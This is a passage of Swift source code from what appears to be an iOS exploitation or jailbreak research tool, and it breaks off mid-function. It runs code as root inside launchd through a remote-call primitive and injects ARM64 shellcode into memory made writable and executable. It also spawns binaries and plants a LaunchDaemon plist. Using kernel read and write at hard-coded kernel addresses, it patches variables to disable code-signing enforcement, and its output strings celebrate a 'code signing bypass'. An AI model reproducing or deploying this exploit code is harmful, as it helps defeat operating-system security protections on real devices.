        // Use a safe offset in trojanMem for shellcode (don't overwrite RC data)
        let codeAddr = mem + 0xF00 // offset 0xF00 — safe area
        
        // Step 1: mprotect the page to RWX
        let pageAddr = codeAddr & ~0x3FFF // align to 16KB page
        let mprotRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // RWX
        
        guard mprotRet == 0 else {
            return ExperimentResult(name: "shellcode (mprotect)", success: false, detail: "mprotect failed: \(mprotRet)", timestamp: Date())
        }
        
        // Step 2: Write shellcode: mov x0, #42; ret
        var shellcode: [UInt8] = [
            0x40, 0x05, 0x80, 0xD2,  // mov x0, #42
            0xC0, 0x03, 0x5F, 0xD6,  // ret
        ]
        rc.remote_write(codeAddr, from: &shellcode, size: UInt64(shellcode.count))
        
        // Step 3: Clear instruction cache (important for ARM!)
        // sys_icache_invalidate equivalent
        RootExecutor.rcall(rc, "sys_icache_invalidate", codeAddr, UInt64(shellcode.count))
        
        // Step 4: Call shellcode as function via RemoteCall
        // RemoteCall will PAC-sign the pointer before jumping
        var noArgs: [UInt64] = [0]
        let result = "mprotect_shellcode".withCString { cName -> UInt64 in
            UInt64(noArgs.withUnsafeMutableBufferPointer { buffer in
                rc.doStable(
                    withTimeout: 5,
                    functionName: UnsafeMutablePointer(mutating: cName),
                    functionPointer: UnsafeMutableRawPointer(bitPattern: UInt(codeAddr)),
                    args: buffer.baseAddress,
                    argCount: 0
                )
            })
        }
        
        let success = result == 42
        let detail = """
        trojanMem: 0x\(String(format: "%llx", mem))
        code addr: 0x\(String(format: "%llx", codeAddr))
        mprotect(RWX): ✅
        shellcode: mov x0, #42; ret
        RESULT: \(result) \(success ? "🎉🎉🎉 SHELLCODE EXECUTED!!!" : "❌ (APRR may still block)")
        
        \(success ? "FULL ARBITRARY CODE EXECUTION ACHIEVED!\nWe can run ANY ARM64 code as root!" : "If 0 or crash → APRR hardware still enforces W^X\nIf non-42 → PAC or other issue")
        """
        
        return ExperimentResult(name: "⚡ SHELLCODE (mprotect)", success: success, detail: detail, timestamp: Date())
    }
    
    /// Fork child, keep it alive, try to execve in it
    /// Strategy: fork() → child inherits launchd's state → 
    /// use posix_spawn in CHILD context (child is trusted like launchd)
    /// OR: directly call execve() which replaces child with target binary
    private func expForkAndConnect(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Strategy A: fork + posix_spawn in same call sequence
        // After fork(), parent gets child PID, child gets 0
        // But in RC context, we're always in parent...
        
        // Strategy B: Use vfork() — child shares address space with parent
        // until exec. This means we can set up execve args BEFORE vfork,
        // and child will use them!
        
        // Strategy C: fork + immediately execve via kernel manipulation
        // We can find the child's thread in kernel and set its PC to execve
        
        // Let's try Strategy B: vfork + execve
        // vfork() is special: child shares parent's memory until exec
        // So if we setup args at known address, child can use them
        
        // First: setup execve arguments in trojanMem
        let binPath = "/bin/df"
        let binAddr = remote_alloc_str(rc, binPath)
        let argvBase = mem + 0x500
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0) // NULL terminator
        
        // Setup output redirect: open file for stdout before fork
        let outFile = "/tmp/.dsp_fork_exec_out"
        let outAddr = remote_alloc_str(rc, outFile)
        RootExecutor.rcall(rc, "unlink", outAddr)
        let outFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        
        // dup2(outFd, 1) — redirect stdout to file BEFORE fork
        // Child will inherit this fd
        // BUT we don't want to mess up launchd's stdout permanently
        // Save original stdout first
        let origStdout = RootExecutor.rcall(rc, "dup", 1)
        RootExecutor.rcall(rc, "dup2", outFd, 1) // stdout → file
        RootExecutor.rcall(rc, "dup2", outFd, 2) // stderr → file
        
        // Now fork — child inherits redirected stdout
        let childPid = RootExecutor.rcall(rc, "fork")
        
        // Restore parent's stdout immediately
        RootExecutor.rcall(rc, "dup2", origStdout, 1)
        RootExecutor.rcall(rc, "dup2", origStdout, 2)
        RootExecutor.rcall(rc, "close", origStdout)
        RootExecutor.rcall(rc, "close", outFd)
        
        var detail = "fork() = \(childPid)\n"
        
        if childPid == 0 {
            // We're in child (shouldn't happen in RC)
            detail += "Unexpected: in child context\n"
        } else if childPid == UInt64(bitPattern: -1) {
            detail += "fork failed!\n"
        } else {
            detail += "Child PID = \(childPid)\n"
            
            // Wait for child to finish (it should exit quickly since
            // it's a copy of our thread that will hit the RC return trap)
            RootExecutor.rcall(rc, "usleep", 500000) // 0.5s
            
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            let waitRet = RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, UInt64(WNOHANG))
            let status = rc[statusAddr].value32()
            detail += "waitpid: ret=\(waitRet), status=0x\(String(format: "%x", status))\n"
            
            // Now try: posix_spawn with stdout already redirected to file
            // This is different from before — we redirect BEFORE spawn
            let pidAddr2 = mem + 0x2E0
            rc[pidAddr2].setValue64(0)
            
            // Open output file again for new spawn
            let outFd2 = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
            
            // Setup file actions
            let actionsAddr = mem + 0x100
            rc[actionsAddr].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
            // dup2 outFd2 to stdout in child
            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", actionsAddr, outFd2, 1)
            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", actionsAddr, outFd2, 2)
            
            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, binAddr, actionsAddr, 0, argvBase, 0)
            let spawnPid = rc[pidAddr2].value32()
            detail += "\nposix_spawn(/bin/df) with dup2 actions:\n"
            detail += "  ret=\(spawnRet), pid=\(spawnPid)\n"
            
            RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
            
            if spawnRet == 0 {
                // Wait for spawned process
                RootExecutor.rcall(rc, "usleep", 1000000) // 1s
                RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
            }
            
            RootExecutor.rcall(rc, "close", outFd2)
            
            // Read output
            let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
            if readFd != UInt64(bitPattern: -1) {
                let bufAddr = mem + 0x800
                let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
                if n > 0 && n < 2001 {
                    var buf = [UInt8](repeating: 0, count: Int(n))
                    rc.remoteRead(bufAddr, to: &buf, size: n)
                    let output = String(bytes: buf, encoding: .utf8) ?? "(binary)"
                    detail += "\nOUTPUT (\(n) bytes):\n\(output.prefix(400))"
                } else {
                    detail += "\nNo output (n=\(n))"
                }
                RootExecutor.rcall(rc, "close", readFd)
            }
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        
        let hasOutput = detail.contains("OUTPUT")
        return ExperimentResult(
            name: "fork + dup2 + spawn",
            success: hasOutput,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Test: can we use ldid/codesign-style ad-hoc signing?
    /// Write binary with valid Mach-O structure + ad-hoc signature
    private func expAdHocSign(rc: RemoteCall) -> ExperimentResult {
        // Replaced by expDYLDInsert, expLaunchdXPCSpawn, expSpawnWithEnv
        return ExperimentResult(name: "ad-hoc (replaced)", success: false, detail: "See experiments 30-32", timestamp: Date())
    }
    
    /// RELIABLE spawn — isolated test with extra debugging
    /// Reproduces exact pattern that gave 1795 chars from /bin/df
    private func expReliableSpawn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Use DIFFERENT memory offsets from other experiments to avoid collision
        let outFile = "/tmp/.dsp_reliable_out"
        let outAddr = remote_alloc_str(rc, outFile)
        
        // Step 1: Delete old file
        RootExecutor.rcall(rc, "unlink", outAddr)
        
        // Step 2: Init file actions at DIFFERENT offset
        let actionsAddr = mem + 0x1800 // far from other experiments
        rc[actionsAddr].setValue64(0)
        rc[actionsAddr + 8].setValue64(0)
        rc[actionsAddr + 16].setValue64(0)
        let initRet = RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
        
        // Step 3: addopen stdout
        let addRet1 = RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        // addopen stderr
        let addRet2 = RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
        
        // Step 4: Setup argv at different offset
        let binAddr = remote_alloc_str(rc, "/bin/df")
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0) // NULL
        
        // Step 5: Spawn
        let pidAddr = mem + 0x1A00
        rc[pidAddr].setValue64(0xAAAA) // sentinel
        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, 0)
        let pidAfter = rc[pidAddr].value32()
        
        // Step 6: LONG wait (2 seconds)
        RootExecutor.rcall(rc, "usleep", 2000000)
        
        // Step 7: waitpid(-1) to reap ANY child
        let statusAddr = mem + 0x1B00
        rc[statusAddr].setValue32(0)
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
        let waitStatus = rc[statusAddr].value32()
        
        // Step 8: Check if output file exists and has content
        let statAddr = mem + 0x1D00
        let statRet = RootExecutor.rcall(rc, "stat", outAddr, statAddr)
        
        // Step 9: Read output
        var output = ""
        var fileSize: UInt64 = 0
        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        if readFd != UInt64(bitPattern: -1) {
            // Get file size via lseek
            fileSize = RootExecutor.rcall(rc, "lseek", readFd, 0, 2) // SEEK_END
            RootExecutor.rcall(rc, "lseek", readFd, 0, 0) // SEEK_SET
            
            let bufAddr = mem + 0x1E00
            let toRead = min(fileSize, 2000)
            if toRead > 0 {
                let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, toRead)
                if n > 0 && n <= toRead {
                    var buf = [UInt8](repeating: 0, count: Int(n))
                    rc.remoteRead(bufAddr, to: &buf, size: n)
                    output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
                }
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        file_actions_init: \(initRet)
        addopen(stdout): \(addRet1)
        addopen(stderr): \(addRet2)
        posix_spawn: ret=\(spawnRet), pid_sentinel=0x\(String(format: "%x", pidAfter))
        usleep(2s): done
        waitpid(-1): ret=\(waitRet), status=0x\(String(format: "%x", waitStatus))
        stat(outfile): \(statRet == 0 ? "EXISTS" : "MISSING")
        file size: \(fileSize)
        output (\(output.count) chars):
        \(output.prefix(500))
        """
        
        return ExperimentResult(
            name: "reliable spawn /bin/df",
            success: !output.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Call launchd's internal job submission
    /// We ARE running inside launchd — we can call its own APIs!
    private func expLaunchdJobSubmit(rc: RemoteCall) -> ExperimentResult {
        // launchd uses xpc internally. Key functions:
        // - xpc_dictionary_create
        // - xpc_dictionary_set_string
        // - job_new / job_dispatch
        
        // Simpler approach: use launch_data API (older but might work)
        // launch_data_new_string, launch_data_dict_insert, launch_msg
        
        // Actually simplest: just try posix_spawn with NULL file_actions
        // but with proper posix_spawnattr that sets process group
        // This isolates the spawn from launchd's own process group
        
        let mem = rc.trojanMem
        
        // Try: spawn /sbin/mount (known to exist) with NO file actions
        // Just check if it actually runs (creates a process)
        let binAddr = remote_alloc_str(rc, "/sbin/mount")
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // Use posix_spawnattr with SETPGROUP
        let attrAddr = mem + 0x1800
        rc[attrAddr].setValue64(0)
        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
        // POSIX_SPAWN_SETPGROUP = 0x0002
        // POSIX_SPAWN_SETSID = 0x0400 (new session)
        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, 0x0402) // SETPGROUP | SETSID
        RootExecutor.rcall(rc, "posix_spawnattr_setpgroup", attrAddr, 0) // new pgroup
        
        let pidAddr = mem + 0x1A00
        rc[pidAddr].setValue64(0xBBBB)
        
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, attrAddr, argvBase, 0)
        let pidVal = rc[pidAddr].value32()
        
        // Wait
        RootExecutor.rcall(rc, "usleep", 1000000)
        let statusAddr = mem + 0x1B00
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
        
        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        posix_spawn(/sbin/mount, attr=[SETPGROUP|SETSID], no file_actions):
        ret=\(ret), pid=0x\(String(format: "%x", pidVal))
        waitpid(-1): \(waitRet)
        
        If waitpid returns real PID → process actually spawned!
        SETSID creates new session — might bypass some restrictions
        """
        
        return ExperimentResult(name: "spawn + SETSID", success: waitRet > 0 && waitRet != UInt64(bitPattern: -1), detail: detail, timestamp: Date())
    }
    
    /// Test various posix_spawn flags
    private func expSpawnFlags(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, "/bin/df")
        var results: [String] = []
        
        // Test different flag combinations
        let flagSets: [(String, UInt64)] = [
            ("no flags", 0),
            ("SETPGROUP", 0x0002),
            ("SETSID", 0x0400),
            ("CLOEXEC_DEFAULT", 0x1000),
            ("SETPGROUP|SETSID", 0x0402),
            ("all safe flags", 0x1402),
        ]
        
        for (name, flags) in flagSets {
            let attrAddr = mem + 0x1800
            rc[attrAddr].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
            if flags != 0 {
                RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
            }
            
            let argvBase = mem + 0x1C00
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0)
            
            let pidAddr = mem + 0x1A00
            rc[pidAddr].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, flags == 0 ? 0 : attrAddr, 0, argvBase, 0)
            
            // Quick wait
            RootExecutor.rcall(rc, "usleep", 300000) // 0.3s
            let statusAddr = mem + 0x1B00
            let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
            
            results.append("\(name): ret=\(ret), wait=\(waitRet)")
            
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        }
        
        RootExecutor.rcall(rc, "free", binAddr)
        
        let anyWaited = results.contains(where: { $0.contains("wait=") && !$0.contains("wait=0") && !$0.contains("wait=18446") })
        
        return ExperimentResult(
            name: "spawn flag variants",
            success: anyWaited,
            detail: results.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Use launchd's internal spawn mechanism via xpc/launchctl
    /// launchd spawns daemons all the time — can we make it spawn OUR binary?
    private func expLaunchdXPCSpawn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Write a LaunchDaemon plist that points to /bin/df
        // Then try to load it via launchd's internal API
        let plist = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.dsploit.test.spawn</string>
            <key>ProgramArguments</key>
            <array>
                <string>/bin/df</string>
                <string>-h</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>StandardOutPath</key>
            <string>/tmp/.dsp_launchd_spawn_out</string>
            <key>StandardErrorPath</key>
            <string>/tmp/.dsp_launchd_spawn_out</string>
        </dict>
        </plist>
        """
        
        // Write plist
        let plistPath = "/var/root/.dsp_test_daemon.plist"
        let plistAddr = remote_alloc_str(rc, plistPath)
        let fd = RootExecutor.rcall(rc, "open", plistAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        if fd != UInt64(bitPattern: -1) {
            let contentAddr = remote_alloc_str(rc, plist)
            RootExecutor.rcall(rc, "write", fd, contentAddr, UInt64(plist.utf8.count))
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "free", contentAddr)
        }
        
        // Try to load via launch_data API or xpc
        // launchd has internal function: launch_data_new_string, launch_msg
        // Or simpler: just check if the plist is valid and launchd can read it
        
        // Actually — we're IN launchd! We can call its internal submit function!
        // job_submit() or runtime_add_job()
        // But these are private symbols...
        
        // Alternative: use xpc_connection to com.apple.launchd
        // and send a "load" message
        
        // For now: check if output file gets created (meaning launchd spawned it)
        RootExecutor.rcall(rc, "usleep", 2000000) // 2s wait
        
        let outPath = remote_alloc_str(rc, "/tmp/.dsp_launchd_spawn_out")
        let outFd = RootExecutor.rcall(rc, "open", outPath, UInt64(O_RDONLY), 0)
        var output = ""
        if outFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", outFd, bufAddr, 2000)
            if n > 0 && n < 2001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? ""
            }
            RootExecutor.rcall(rc, "close", outFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", plistAddr)
        RootExecutor.rcall(rc, "unlink", outPath)
        RootExecutor.rcall(rc, "free", plistAddr)
        RootExecutor.rcall(rc, "free", outPath)
        
        let detail = """
        Wrote LaunchDaemon plist to \(plistPath)
        Program: /bin/df -h
        StandardOutPath: /tmp/.dsp_launchd_spawn_out
        
        Output file: \(outFd != UInt64(bitPattern: -1) ? "EXISTS (\(output.count) chars)" : "NOT CREATED")
        \(output.isEmpty ? "(launchd didn't spawn — need to call load API)" : "OUTPUT:\n\(output.prefix(300))")
        
        Next: call launchd's internal job_submit/load API
        """
        
        return ExperimentResult(name: "launchd plist spawn", success: !output.isEmpty, detail: detail, timestamp: Date())
    }
    
    /// posix_spawn with full environment (envp) — test DYLD variables
    private func expSpawnWithEnv(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let outFile = "/tmp/.dsp_env_test"
        let outAddr = remote_alloc_str(rc, outFile)
        RootExecutor.rcall(rc, "unlink", outAddr)
        
        // File actions
        let actionsAddr = mem + 0x100
        rc[actionsAddr].setValue64(0)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
        
        // Use /bin/ps this time (different binary)
        let binAddr = remote_alloc_str(rc, "/bin/ps")
        let argAddr = remote_alloc_str(rc, "ps")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(argAddr)
        rc[argvBase + 8].setValue64(0)
        
        // Minimal environment
        let envBase = mem + 0x480
        let pathEnv = remote_alloc_str(rc, "PATH=/sbin:/usr/sbin:/bin:/usr/bin")
        let homeEnv = remote_alloc_str(rc, "HOME=/var/root")
        rc[envBase].setValue64(pathEnv)
        rc[envBase + 8].setValue64(homeEnv)
        rc[envBase + 16].setValue64(0)
        
        // Spawn
        let pidAddr = mem + 0x2E0
        rc[pidAddr].setValue64(0)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, envBase)
        
        // Wait
        RootExecutor.rcall(rc, "usleep", 1000000)
        RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        
        // Read
        var output = ""
        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        if readFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 3000)
            if n > 0 && n < 3001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? ""
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        RootExecutor.rcall(rc, "free", argAddr)
        RootExecutor.rcall(rc, "free", pathEnv)
        RootExecutor.rcall(rc, "free", homeEnv)
        
        let detail = """
        posix_spawn(/bin/ps, env=[PATH, HOME]): ret=\(ret)
        output (\(output.count) chars):
        \(output.prefix(500))
        
        If output shows process list → /bin/ps works with env!
        """
        
        return ExperimentResult(name: "spawn /bin/ps + env", success: ret == 0 && !output.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Output Capture Research (processes spawn but output empty)
    
    /// 🔥 THE BREAKTHROUGH: Patch pmap_cs_allow_invalid_internal
    /// This variable is in __DATA (WRITABLE!) at unslid VA 0xfffffff00a0e45b8
    /// Setting it to 1 disables code signing enforcement!
    private func expPatchCSEnforcement(rc: RemoteCall) -> ExperimentResult {
        let mgr = dspmgr.shared
        
        // Unslid kernel VA of pmap_cs_allow_invalid_internal
        let unslidVA: UInt64 = 0xfffffff00a0e45b8
        
        // Calculate runtime address: unslid + slide
        let slide = mgr.kernslide
        let runtimeAddr = unslidVA + slide
        
        var detail = """
        🔥 pmap_cs_allow_invalid_internal
        Unslid VA:    0x\(String(format: "%llx", unslidVA))
        Kernel slide: 0x\(String(format: "%llx", slide))
        Runtime addr: 0x\(String(format: "%llx", runtimeAddr))
        
        """
        
        // Step 1: Read current value
        let currentVal = ds_kread32(runtimeAddr)
        detail += "Step 1 — Read current: 0x\(String(format: "%x", currentVal))\n"
        
        if currentVal == 1 {
            detail += "Already set to 1! CS enforcement already disabled!\n"
            return ExperimentResult(name: "🔥 PATCH CS ENFORCEMENT", success: true, detail: detail, timestamp: Date())
        }
        
        // Step 2: Write 1 to disable code signing
        detail += "Step 2 — Writing 1 to disable CS enforcement...\n"
        ds_kwrite32(runtimeAddr, 1)
        
        // Step 3: Read back to verify
        let afterVal = ds_kread32(runtimeAddr)
        detail += "Step 3 — Read back: 0x\(String(format: "%x", afterVal))\n\n"
        
        if afterVal == 1 {
            detail += "✅✅✅ WRITE SUCCEEDED! CS ENFORCEMENT DISABLED! ✅✅✅\n\n"
            detail += "Code signing is now DISABLED in kernel!\n"
            detail += "Testing: spawn copied binary...\n\n"
            
            // Step 4: TEST — copy /bin/df to /tmp and spawn it!
            let mem = rc.trojanMem
            let srcPath = remote_alloc_str(rc, "/bin/df")
            let dstPath = remote_alloc_str(rc, "/tmp/.dsp_unsigned_test")
            
            // Copy binary
            let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
            let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            
            if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
                let bufAddr = mem + 0x800
                var copied: UInt64 = 0
                for _ in 0..<100 {
                    let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
                    if n == 0 || n > 2048 { break }
                    RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
                    copied += n
                }
                RootExecutor.rcall(rc, "close", srcFd)
                RootExecutor.rcall(rc, "close", dstFd)
                
                detail += "Copied /bin/df to /tmp (\(copied) bytes)\n"
                
                // Try to spawn the COPY (previously failed with ret=1!)
                let argvBase = mem + 0x1C00
                rc[argvBase].setValue64(dstPath)
                rc[argvBase + 8].setValue64(0)
                let pidAddr = mem + 0x1A00
                rc[pidAddr].setValue64(0)
                
                let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
                let spawnPid = rc[pidAddr].value32()
                
                detail += "posix_spawn(/tmp/copy): ret=\(spawnRet), pid=\(spawnPid)\n"
                
                // Wait and reap
                RootExecutor.rcall(rc, "usleep", 1000000)
                let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
                detail += "waitpid: \(waitRet)\n\n"
                
                if spawnRet == 0 {
                    detail += "🎉🎉🎉 COPIED BINARY SPAWNED!!! 🎉🎉🎉\n"
                    detail += "CODE SIGNING BYPASS ACHIEVED!\n"
                    detail += "CAN NOW RUN ANY BINARY AS ROOT!\n"
                    detail += "FULL JAILBREAK UNLOCKED!\n"
                } else if spawnRet == 1 {
                    detail += "❌ Still ret=1 (AMFI still blocking)\n"
                    detail += "pmap_cs_allow_invalid might not be enough alone\n"
                    detail += "May need to also patch cs_enforcement_disable\n"
                } else {
                    detail += "ret=\(spawnRet) — different error than before!\n"
                }
                
                // Cleanup
                RootExecutor.rcall(rc, "unlink", dstPath)
            }
            
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            
            return ExperimentResult(name: "🔥 PATCH CS ENFORCEMENT", success: afterVal == 1, detail: detail, timestamp: Date())
            
        } else {
            detail += "❌ Write FAILED — value still 0x\(String(format: "%x", afterVal))\n"
            detail += "PPL may protect this address despite being in __DATA\n"
            detail += "Or: address calculation wrong (check kernel_slide)\n"
            
            return ExperimentResult(name: "🔥 PATCH CS ENFORCEMENT", success: false, detail: detail, timestamp: Date())
        }
    }
    
    /// 🔥 SAFE READ: Test if cs_enforcement_disable candidate is accessible
    /// Address 0xfffffff00a3304e8 found via code tracing (references cs_enforcement_disable string)
    /// ONLY READS — no write, no panic risk (unless address is in bad zone)
    private func expSafeReadCSVar(rc: RemoteCall) -> ExperimentResult {
        let mgr = dspmgr.shared
        let slide = mgr.kernslide
        
        // Target: 0xfffffff00a3304e8 (found by tracing code that refs "cs_enforcement_disable")
        let candidateUnslid: UInt64 = 0xfffffff00a3304e8
        let candidateAddr = candidateUnslid + slide
        
        var detail = "🔥 Safe read of cs_enforcement_disable candidate\n\n"
        detail += "Unslid VA: 0x\(String(format: "%llx", candidateUnslid))\n"
        detail += "Slide: 0x\(String(format: "%llx", slide))\n"
        detail += "Runtime addr: 0x\(String(format: "%llx", candidateAddr))\n\n"
        
        // Check if address looks valid
        let isValid = ds_isvalid(candidateAddr)
        detail += "ds_isvalid: \(isValid)\n\n"
        
        guard isValid else {
            detail += "❌ Address not valid for KRW — would panic!\n"
            detail += "This address might be in a different zone.\n"
            return ExperimentResult(name: "🔥 SAFE READ cs_var", success: false, detail: detail, timestamp: Date())
        }
        
        // SAFE READ using ds_kread32_safe (returns 0 on failure instead of panic)
        let val32 = ds_kread32_safe(candidateAddr)
        detail += "Read (32-bit safe): 0x\(String(format: "%08x", val32))\n"
        
        // Also read nearby values to understand context
        detail += "\nContext (±32 bytes):\n"
        for offset in stride(from: -32, through: 32, by: 4) {
            let addr = candidateAddr + UInt64(bitPattern: Int64(offset))
            if ds_isvalid(addr) {
                let v = ds_kread32_safe(addr)
                let marker = offset == 0 ? " ← TARGET" : ""
                if v != 0 || offset == 0 {
                    detail += "  +\(offset): 0x\(String(format: "%08x", v))\(marker)\n"
                }
            }
        }
        
        detail += "\n"
        if val32 == 0 {
            detail += "Value is 0 — could be cs_enforcement_disable (disabled=0, enabled would be non-zero)\n"
            detail += "NEXT: Try writing 1 to this address and test spawn\n"
            detail += "⚠️ Only do this if you're OK with potential panic\n"
        } else if val32 == 1 {
            detail += "Value is 1 — already set! (or this is a different variable)\n"
        } else {
            detail += "Value is 0x\(String(format: "%x", val32)) — probably NOT a flag variable\n"
            detail += "Flags are typically 0 or 1. This might be wrong address.\n"
        }
        
        return ExperimentResult(name: "🔥 SAFE READ cs_var", success: isValid, detail: detail, timestamp: Date())
    }
    
    /// 🔥🔥 Patch cs_enforcement_disable — the REAL disable flag!
    /// Pointer at __DATA_CONST (0xfffffff007b78390) points to variable in __DATA
    /// Pointer value from file: 0x3160350 → maps to __DATA at vm 0xfffffff00a164350
    /// Also try: read the pointer at runtime to get ACTUAL variable address
    private func expPatchCSEnforcementDisable(rc: RemoteCall) -> ExperimentResult {
        let mgr = dspmgr.shared
        let slide = mgr.kernslide
        
        var detail = "🔥🔥 cs_enforcement_disable patch attempt\n\n"
        
        // The pointer to cs_enforcement_disable is at __DATA_CONST:
        // Unslid: 0xfffffff007b78390
        let ptrAddr = UInt64(0xfffffff007b78390) + slide
        detail += "Pointer location: 0x\(String(format: "%llx", ptrAddr)) (__DATA_CONST)\n"
        
        // Read the pointer to get actual variable address
        let varPtrRaw = ds_kread64(ptrAddr)
        detail += "Pointer value (raw): 0x\(String(format: "%llx", varPtrRaw))\n"
        
        // Strip PAC bits if present
        let varAddr = varPtrRaw & 0x0000007FFFFFFFFF
        detail += "Variable addr (stripped): 0x\(String(format: "%llx", varAddr))\n\n"
        
        // Also try calculated address
        let calcAddr = UInt64(0xfffffff00a164350) + slide
        detail += "Calculated addr: 0x\(String(format: "%llx", calcAddr))\n\n"
        
        // Try reading from both addresses
